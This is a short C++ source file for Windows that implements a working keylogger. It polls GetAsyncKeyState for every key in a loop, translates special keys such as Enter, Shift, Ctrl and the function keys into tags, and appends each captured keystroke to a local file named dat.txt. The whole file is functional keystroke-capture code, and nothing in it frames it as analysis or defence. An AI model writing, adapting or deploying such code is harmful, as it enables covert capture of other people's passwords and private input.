#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>

using namespace std;


void save(string input) {
	cout << input << ", ";
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

void save(char input) {
	string str = "";
	str += input;
	save(str);
}


string parseUnprintable(int S_key) {
	switch (S_key) {
	case VK_SPACE:
		return " ";
	case VK_RETURN:
		return "#ENTER#";
	case VK_SHIFT:
		return "#SHIFT#";	
	case VK_RSHIFT:
		return "#RSHIFT#";
	case VK_CONTROL:
		return "#CONTROL#";
	case VK_MENU:
		return "#ALT#";
	case VK_BACK:
		return "#BACK#";
	case VK_RBUTTON:
		return "#R_CLICK#";
	case VK_CAPITAL:
		return "#CAPS#";
	case VK_TAB:
		return "#TAB#";
	case VK_UP:
		return "#UP#";
	case VK_DOWN:
		return "#DOWN#";
	case VK_LEFT:
		return "#LEFT#";
	case VK_RIGHT:
		return "#RIGHT#";
	default: 
		return "";
	}
}


string parseToString(char key) {

	string parsed = parseUnprintable(key);

	if (parsed != "")
		return parsed;
	else if (key >= 48 && key <= 90)
		parsed += key;
	else if (key >= 112 && key <= 123) {
		parsed += "#F";
		if (key <= 120)
			parsed += (key - 63);
		else {
			parsed += '1';
			parsed += (key - 73);
		}
		
		parsed += '#';
	}

	return parsed;
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);

	while (true) {
		Sleep(10);
		for (unsigned char key = 8; key <= 165; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
				save(parseToString(key));
			
		}
	}

	return 0;
}
